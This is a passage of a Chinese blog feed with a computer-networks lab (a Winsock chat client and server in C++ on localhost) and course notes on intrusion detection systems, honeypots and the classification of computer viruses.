id="提取源IP地址和目的IP地址"><a href="#提取源IP地址和目的IP地址" class="headerlink" title="提取源IP地址和目的IP地址"></a>提取源IP地址和目的IP地址</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Data_t*IPPacket;</span><br><span class="line">ULONGSourceIP,DestinationIP;</span><br><span class="line">IPPacket = (Data_t *) pkt_data;</span><br><span class="line">SourceIP = ntohl(IPPacket-&gt;IPHeader.SrcIP);</span><br><span class="line">DestinationIP = ntohl(IPPacket-&gt;IPHeader.DstIP);</span><br></pre></td></tr></table></figure><h1 id="计网Lab1"><a href="#计网Lab1" class="headerlink" title="计网Lab1"></a>计网Lab1</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winsock.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctime&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="type">char</span> name[<span class="number">16</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">string</span> <span class="title function_">getTime</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">time_t</span> timep;</span><br><span class="line">    time(&amp;timep);</span><br><span class="line">    <span class="type">char</span> tmp[<span class="number">32</span>];</span><br><span class="line">    strftime(tmp, <span class="keyword">sizeof</span>(tmp), <span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>, localtime(&amp;timep));</span><br><span class="line">    <span class="keyword">return</span> tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Buffer</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> name[<span class="number">16</span>];</span><br><span class="line">    <span class="type">char</span> time[<span class="number">32</span>];</span><br><span class="line">    <span class="type">char</span> content[<span class="number">1024</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">handler_Recv</span><span class="params">(LPVOID lparam)</span> &#123;</span><br><span class="line">    SOCKET recvSocket = (SOCKET)(LPVOID)lparam;</span><br><span class="line">    Buffer recvBuf;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">memset</span>((<span class="type">char</span>*)&amp;recvBuf, <span class="number">0</span>, <span class="keyword">sizeof</span>(recvBuf));</span><br><span class="line">        recv(recvSocket, (<span class="type">char</span>*)&amp;recvBuf, <span class="keyword">sizeof</span>(recvBuf), <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; recvBuf.time &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; recvBuf.name &lt;&lt; <span class="string">&quot;: &quot;</span> &lt;&lt; recvBuf.content &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    closesocket(recvSocket);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">handler_Send</span><span class="params">(LPVOID lparam)</span> &#123;</span><br><span class="line">    SOCKET sendSocket = (SOCKET)(LPVOID)lparam;</span><br><span class="line">    Buffer sendBuf;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">memset</span>((<span class="type">char</span>*)&amp;sendBuf, <span class="number">0</span>, <span class="keyword">sizeof</span>(sendBuf));</span><br><span class="line">        <span class="built_in">strcpy</span>(sendBuf.name, name);</span><br><span class="line">        <span class="built_in">cin</span>.getline(sendBuf.content, <span class="keyword">sizeof</span>(sendBuf.content));</span><br><span class="line">        <span class="built_in">string</span> time = getTime();</span><br><span class="line">        <span class="built_in">strcpy</span>(sendBuf.time, time.c_str());</span><br><span class="line">        send(sendSocket, (<span class="type">char</span>*)&amp;sendBuf, <span class="keyword">sizeof</span>(sendBuf), <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    closesocket(sendSocket);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line">    SOCKET ClientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line">    SOCKADDR_IN ServerAddr;</span><br><span class="line">    ServerAddr.sin_family = AF_INET;</span><br><span class="line">    USHORT uPort = <span class="number">8888</span>;</span><br><span class="line">    ServerAddr.sin_port = htons(uPort);</span><br><span class="line">    ServerAddr.sin_addr.S_un.S_addr = inet_addr(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入您的姓名:&quot;</span>;</span><br><span class="line">    <span class="built_in">cin</span>.getline(name, <span class="number">16</span>);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;等待连接...&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    connect(ClientSocket, (SOCKADDR*)&amp;ServerAddr, <span class="keyword">sizeof</span>(ServerAddr));</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;连接成功，欢迎您用户&quot;</span> &lt;&lt; name &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    </span><br><span class="line">    Buffer tmp;</span><br><span class="line">    <span class="built_in">memset</span>((<span class="type">char</span>*)&amp;tmp, <span class="number">0</span>, <span class="keyword">sizeof</span>(tmp));</span><br><span class="line">    <span class="built_in">strcpy</span>(tmp.name, name);</span><br><span class="line">    <span class="built_in">string</span> time = getTime();</span><br><span class="line">    <span class="built_in">strcpy</span>(tmp.time, time.c_str());</span><br><span class="line">    <span class="built_in">strcpy</span>(tmp.content, <span class="string">&quot;enters the chat room&quot;</span>);</span><br><span class="line">    send(ClientSocket, (<span class="type">char</span>*)&amp;tmp, <span class="keyword">sizeof</span>(tmp), <span class="number">0</span>);</span><br><span class="line">  </span><br><span class="line">    HANDLE hThread_send = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;handler_Send, LPVOID(ClientSocket), <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    HANDLE hThread_recv = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;handler_Recv, LPVOID(ClientSocket), <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">   </span><br><span class="line">    CloseHandle(hThread_send);</span><br><span class="line">    CloseHandle(hThread_recv);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winsock.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctime&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 5</span></span><br><span class="line">SOCKET ClientSocket[MaxSize];</span><br><span class="line"><span class="type">int</span> index = <span class="number">0</span>;<span class="comment">//全局变量，当前连接数</span></span><br><span class="line"></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Buffer</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> name[<span class="number">16</span>];</span><br><span class="line">    <span class="type">char</span> time[<span class="number">32</span>];</span><br><span class="line">    <span class="type">char</span> content[<span class="number">1024</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI <span class="title function_">handler_Recv</span><span class="params">(LPVOID lparam)</span> &#123;</span><br><span class="line">    SOCKET recvSocket = (SOCKET)(LPVOID)lparam;</span><br><span class="line">    Buffer recvBuf;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">memset</span>((<span class="type">char</span>*)&amp;recvBuf, <span class="number">0</span>, <span class="keyword">sizeof</span>(recvBuf));</span><br><span class="line">        recv(recvSocket, (<span class="type">char</span>*)&amp;recvBuf, <span class="keyword">sizeof</span>(recvBuf), <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; recvBuf.time &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; recvBuf.name &lt;&lt; <span class="string">&quot;: &quot;</span> &lt;&lt; recvBuf.content &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; index; i++) &#123;</span><br><span class="line">            send(ClientSocket[i], (<span class="type">char</span>*)&amp;recvBuf, <span class="keyword">sizeof</span>(recvBuf), <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    closesocket(recvSocket);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//DWORD WINAPI handler_Send(LPVOID lparam) &#123;</span></span><br><span class="line"><span class="comment">//    SOCKET sendSocket = (SOCKET)(LPVOID)lparam;</span></span><br><span class="line"><span class="comment">//    char sendBuf[1024];</span></span><br><span class="line"><span class="comment">//    while (1) &#123;</span></span><br><span class="line"><span class="comment">//        memset(sendBuf, 0, sizeof(sendBuf));</span></span><br><span class="line"><span class="comment">//        cin.getline(sendBuf, sizeof(sendBuf));</span></span><br><span class="line"><span class="comment">//        send(sendSocket, sendBuf, sizeof(sendBuf), 0);</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="comment">//    closesocket(sendSocket);</span></span><br><span class="line"><span class="comment">//    return 0;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line">    SOCKET ServerSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line">    SOCKADDR_IN ServerAddr;</span><br><span class="line">    ServerAddr.sin_family = AF_INET;</span><br><span class="line">    USHORT uPort = <span class="number">8888</span>;</span><br><span class="line">    ServerAddr.sin_port = htons(uPort);</span><br><span class="line">    ServerAddr.sin_addr.S_un.S_addr = inet_addr(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> n = bind(ServerSocket, (SOCKADDR*)&amp;ServerAddr, <span class="keyword">sizeof</span>(ServerAddr));</span><br><span class="line">    <span class="keyword">if</span> (n == SOCKET_ERROR)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;failed to bind!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    SOCKADDR_IN ClientAddr;</span><br><span class="line">    <span class="type">int</span> ClientAddrlen = <span class="keyword">sizeof</span>(ClientAddr);</span><br><span class="line">    <span class="type">int</span> l = listen(ServerSocket, MaxSize);</span><br><span class="line">    <span class="keyword">if</span> (l != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;error&quot;</span> &lt;&lt; GetLastError() &lt;&lt; l &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Welcome to the chat room&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        ClientSocket[index] = accept(ServerSocket, (SOCKADDR*)&amp;ClientAddr, &amp;ClientAddrlen);</span><br><span class="line">        HANDLE hThread_recv = CreateThread(<span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;handler_Recv, LPVOID(ClientSocket[index]), <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">        index++;</span><br><span class="line">        CloseHandle(hThread_recv);</span><br><span class="line">    &#125;</span><br><span class="line">    closesocket(ServerSocket);</span><br><span class="line">    WSACleanup();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> network </tag>
            
            <tag> socket </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>入侵检测系统</title>
      <link href="/2023/03/20/ru-qin-jian-ce-xi-tong/"/>
      <url>/2023/03/20/ru-qin-jian-ce-xi-tong/</url>
      
        <content type="html"><![CDATA[<h2 id="入侵检测基本概念"><a href="#入侵检测基本概念" class="headerlink" title="入侵检测基本概念"></a>入侵检测基本概念</h2><p><strong>什么是入侵？</strong></p><p>通过计算机网络非法进入他人计算机系统</p><p>例如：入侵者获取Alice的用户名和密码来假冒Alice进入计算机系统</p><br/><p><strong>入侵检测基本概念</strong></p><ul><li>基本思想（始于1980’s中期）：入侵者与合法用户具有不同的用户行为，这些行为可以通过定量的方法测量出来</li><li>行为检测：将用户用机和用网行为刻画成一系列离散事件，然后找出这些事件的内在规律，并以此为基础发现异常行为，即入侵迹象</li><li>入侵检测<ul><li>尽快的识别出已发生或正在发生的入侵行为，收集入侵证据</li><li>常用手段：检测不正常行为（异常行为）</li></ul></li><li>怎样构造一个自动检测工具去发现这些入侵行为？<ul><li>入侵检测系统(IDS)</li></ul></li></ul><br/><p><strong>入侵检测基本方法</strong></p><ul><li>收集系统日志并进行分析<ul><li>系统日志是离散时序事件的集合，它记录系统的使用情况，包括登录、程序运行和网络连接等重要信息，反应了用户用机和用网行为</li><li>系统日志不仅可以发现入侵行为，也可以为入侵发生后的取证和修复提供依据，作为入侵者犯罪的有力证据。</li></ul></li><li>入侵检测可分为：<ul><li>网检(NBD)：通过跟踪<strong>用户的上网行为</strong>来构建行为特征</li><li>机检(HBD)：通过跟踪<strong>用户使用主机的行为</strong>构建行为特征</li></ul></li></ul><p><img src="/2023/03/20/ru-qin-jian-ce-xi-tong/2df1bf4d6142dc0641700dc0cdeb430f.png" class="lazyload placeholder" data-srcset="/2023/03/20/ru-qin-jian-ce-xi-tong/2df1bf4d6142dc0641700dc0cdeb430f.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><br/><p><strong>IDS(入侵检测系统)组成</strong></p><p>分为三部分：</p><ul><li>评估：对系统的安全需求做出整体评价，并给出系统安全表征(security profile)(各项安全指标)</li><li>检测：建立用户行为特征轮廓、记录用机事件并根据用户行为。特征轮廓分析所收集到的事件，找出异常行为</li><li>警报：通知用户或系统管理员异常用机行为，并自动做出相应的反应</li></ul><br/><p><strong>IDP(入侵检测策略)</strong></p><p>识别入侵行为必须首先制定入侵检测策略(IDP)</p><ul><li><p>规定哪些数据必须保护以及受保护的程度</p></li><li><p>定义哪些是入侵行为并且在识别出后的应对措施</p></li><li><p>存在错判和漏判</p></li></ul><p>行为分类</p><ol><li>绿灯行为：可接受的正常行为（遵循系统安全策略的一系列行为事件)，放行</li><li>红灯行为：必须拒绝的不可接受行为（违反系统安全策路的一系列行为事件)，终止用户登录，切断网络连接，关机</li><li>黄灯行为：基于当前信息无法判断的行为，需要收集更多信息作为判断依据</li></ol><br/><p><strong>IDS体系结构</strong></p><ul><li>指令控制台：控制和管理目标主机，断网<ul><li>评估管理：用于管理和评估安全模型</li><li>入侵管理：用于维护与目标端的连接，为目标端的审计设置、机检和网检系统制定策略</li><li>警报管理：用于收集和管理从机检和网检送来的警报，根据收集到的事件日志对这些警报做全面分析，决定应变措施</li><li>原始审计日志汇总：用于收集从目标端送来的审计日志</li><li>入侵检测：用于检测收到的日志，如发现问题就将其交给警报管理进行处理</li><li>审计整理：用于分析整理日志和删除不相关的事件</li><li>数据库：用于存储经过筛选的日志和统计数据</li><li>报告：向指令控制台送出入侵检测报告</li></ul><br/></li><li>监视对象：监视设备上的入侵行为<ul><li>安全模型：用于表示系统中各项安全指标</li><li>审计设置：用于定义检查哪些安全项目、收集哪些事件</li><li>机检：用于检测<strong>事件日志</strong>的入侵检测技术，并向警报管理发出警报</li><li>网检：用于检测<strong>网络数据包</strong>的入侵检测技术，并向警报管理发出警报</li><li>网络监听器：用于监听<strong>网络流量和数据包</strong>，为网检系统提供数据</li></ul></li></ul><br/><h2 id="网检和机检"><a href="#网检和机检" class="headerlink" title="网检和机检"></a>网检和机检</h2><p><strong>网检系统(NBD)</strong></p><p>NBD：基于网络的入侵检测系统，简称网络检测系统或网检系统</p><ul><li>NBD功能：通过检查网传数据鉴别不可接受行为，向控制台管理员发送警报信息，并将警报行为保存在系统日志中供日后分析之用</li><li>NBD组成：<ul><li>网络监听：在网络中指定地点收集过往数据包</li><li>检测引擎：分析数据包是否属于不可接受行为，并发出告警消息</li></ul></li></ul><br/><p><strong>NBD结构</strong></p><p><img src="/2023/03/20/ru-qin-jian-ce-xi-tong/690077e4a601d93b2a10f7cf7995c0d1.png" class="lazyload placeholder" data-srcset="/2023/03/20/ru-qin-jian-ce-xi-tong/690077e4a601d93b2a10f7cf7995c0d1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><br/><p><strong>NBD优缺点</strong></p><p>优点</p><ul><li>成本低：只需布置少数几个监测点，便能够监视整个网段</li><li>无干扰：只被动监听和收集数据包</li><li>抗入侵：网检系统很小，不容易被入侵，且被动监听不容易被入侵者发现。</li></ul><p>缺点</p><ul><li>无法分析<strong>加密包</strong>，如IPSec、SSL及SSH协议数据包</li><li>网络流量大时，会因来不及处理数据而产生<strong>漏判</strong></li><li><strong>某些入侵行为难以识别</strong>，如使用碎片攻击的IP数据包，正常的网络行为也会产生IP碎片</li><li><strong>某些入侵行为难以判断是否成功</strong>，因为在监测点看到的信息不够，需要结合入侵者在主机端的行为特征</li></ul><br/><p><strong>机检系统(HBD)</strong></p><p>HBD：基于主机的入侵检测系统，简称主机检测系统或机检系统</p><p>功能：在目标主机上<strong>分析系统事件和用户行为</strong>，发现不可接受行为后向管理员发出警告</p><ul><li>检查操作系统日志</li><li>检查应用程序日志</li><li>检查系统配置</li><li>为事件日志保存备份以防攻击者修改</li></ul><p><img src="/2023/03/20/ru-qin-jian-ce-xi-tong/ab9b29f96534a2a5c89a4e97b1031751.png" class="lazyload placeholder" data-srcset="/2023/03/20/ru-qin-jian-ce-xi-tong/ab9b29f96534a2a5c89a4e97b1031751.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><br/><p><strong>HBD优缺点</strong></p><p>优点：不会因为数据在传输过程中被加密而受影响（到达终端后解密）、不需要特殊的硬件设备、通过检查系统日志，能更精确的分析系统行为</p><p>缺点：需要消耗主机大量计算和存储资源，增加主机负担、直接危害主机操作系统的攻击会影响机检系统的执行、不能安装在路由器和交换器等设备上</p><br/><p><strong>特征检测</strong></p><p>是NBD和HBD发现入侵行为的主要技术，通过检测正在发生的事件，并决定哪些事件可接受、哪些不可接受。</p><p>通常使用一组规则，规则可以是：</p><ul><li>普通用户不能拷贝系统文件</li><li>用户不能直接读写硬盘</li><li>用户不应该访问其他用户的个人目录</li><li>连续三次登录失败后用户不应该继续尝试登录</li></ul><p>可分为：</p><ul><li>网络特征检测：分析数据包的包头及负载特征</li><li>行为特征检测：根据事件制定的检测规则检查用户的用机行为</li><li>混合特征检测：综合了网络特征和行为特征</li></ul><p><img src="/2023/03/20/ru-qin-jian-ce-xi-tong/13d5c409d5eb924a9415d0b2129fda01.png" class="lazyload placeholder" data-srcset="/2023/03/20/ru-qin-jian-ce-xi-tong/13d5c409d5eb924a9415d0b2129fda01.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><br/><h2 id="蜜罐系统"><a href="#蜜罐系统" class="headerlink" title="蜜罐系统"></a>蜜罐系统</h2><p><strong>蜜罐系统</strong></p><p><img src="/2023/03/20/ru-qin-jian-ce-xi-tong/0778943e62882274e7008c6256dace81.png" class="lazyload placeholder" data-srcset="/2023/03/20/ru-qin-jian-ce-xi-tong/0778943e62882274e7008c6256dace81.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><br/><p><strong>蜜罐系统（种类）</strong></p><ul><li><p>1990开发出来</p><ul><li>连在局域网内的实体主机，有真正的IP地址</li><li>需要与操作系统进行高层互动（蜜罐系统通过操作系统与硬盘及其他资源交互）并且用相当的精力去维护</li></ul></li><li><p>1990’s后期，虚拟蜜罐系统</p><ul><li>容易配置</li><li>只需要低层互动（蜜罐系统只往主机硬盘上写数据，无需借助操作系统）</li><li>常用虚拟蜜罐系统Honeyd，KFSensor，CyberCop等</li></ul></li></ul><br/><p><strong>蜜罐系统互动层次</strong></p><ol><li>低层互动：运行蜜罐主机的服务端程序只能往主机的硬盘上写入信息</li><li>中层互动：运行蜜罐主机的服务端程序只能往主机的硬盘上读出和写入信息</li><li>高层互动：运行蜜罐主机的服务端程序可以和主机的操作系统互动，并通过操作系统与主机硬盘和其他系统资源互动</li></ol><p><img src="/2023/03/20/ru-qin-jian-ce-xi-tong/16e9242dd460a8845f7124663a022868.png" class="lazyload placeholder" data-srcset="/2023/03/20/ru-qin-jian-ce-xi-tong/16e9242dd460a8845f7124663a022868.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><br/><p><strong>Honeyd</strong></p><ul><li>在网络层上建构的虚拟蜜罐系统</li><li>是并行运行虚拟IP协议集合的软件引擎</li><li>能够模拟标准网络服务</li><li>能够通过个性化引擎提供蜜罐系统的个性化功能</li><li>能检测并清除蠕虫，分散入侵者注意力，阻止垃圾邮件的传播</li></ul><p><img src="/2023/03/20/ru-qin-jian-ce-xi-tong/159f51a0f9f69196ffdfb6921a67759f.png" class="lazyload placeholder" data-srcset="/2023/03/20/ru-qin-jian-ce-xi-tong/159f51a0f9f69196ffdfb6921a67759f.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入侵检测 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>抗恶意软件</title>
      <link href="/2023/03/19/kang-e-yi-ruan-jian/"/>
      <url>/2023/03/19/kang-e-yi-ruan-jian/</url>
      
        <content type="html"><![CDATA[<h2 id="病毒"><a href="#病毒" class="headerlink" title="病毒"></a>病毒</h2><p>病毒是一段隐藏在程序中的代码，<strong>可以自我复制（需要用户点击）</strong>或者将自己嵌入其它程序。</p><ol><li><strong>不能自我传播</strong>，需要用户点击才能执行</li><li>需要一个主机程序寄生</li><li>含毒载体（带毒载体）：被病毒感染的主机程序</li><li>健康载体：没有被病毒感染的主机程序</li><li>已消毒载体：曾经感染了病毒但目前清除了的主机程序</li><li>病毒的制作是针对于<ol><li>特定的文件系统，文件格式和操作系统</li><li>特定的体系结构，CPU，语言，宏，脚本，调试器，和其它程序或系统环境</li><li>离开了特定的系统和体系结构等因素，病毒会失效</li></ol></li></ol><br/><p><strong>病毒类型</strong></p><p>基于载体类别分类</p><ol><li>引导区病毒<ol><li>在引导区感染引导程序</li><li>利用引导序列激活自己</li><li>修改操作系统，拦截磁盘访问，并感染其它磁盘</li><li>也能感染PC中可以升级的BIOS</li></ol></li><li>文件系统病毒<ol><li>文件系统包含一个指针表，指向一个文件的第一个块</li><li>感染文件指针表，修改指针值，或者将自己复制到其他文件系统中</li></ol></li><li>文件格式病毒<ol><li>感染特定格式的文件如EXE病毒感染.exe扩展二进制文件</li></ol></li><li>宏病毒<ol><li>感染包含宏指令的文档吗，如微软的Word、Excel、Powerpoint等</li></ol></li><li>脚本病毒<ol><li>感染脚本文件，如VBScript，JScript，UNIX Shell等</li><li>常以电子邮件，办公文档和Web文档的方式自我复制</li></ol></li><li>注册表病毒<ol><li>感染微软Windows系统的注册表</li></ol></li><li>内存病毒<ol><li>感染在内存中执行的程序</li></ol></li></ol><br/><p>基于生存形式分类</p><ol><li>隐蔽型病毒<ol><li>试图躲在载体内不被发现，通常用压缩来实现</li></ol></li><li><strong>多态病毒</strong>    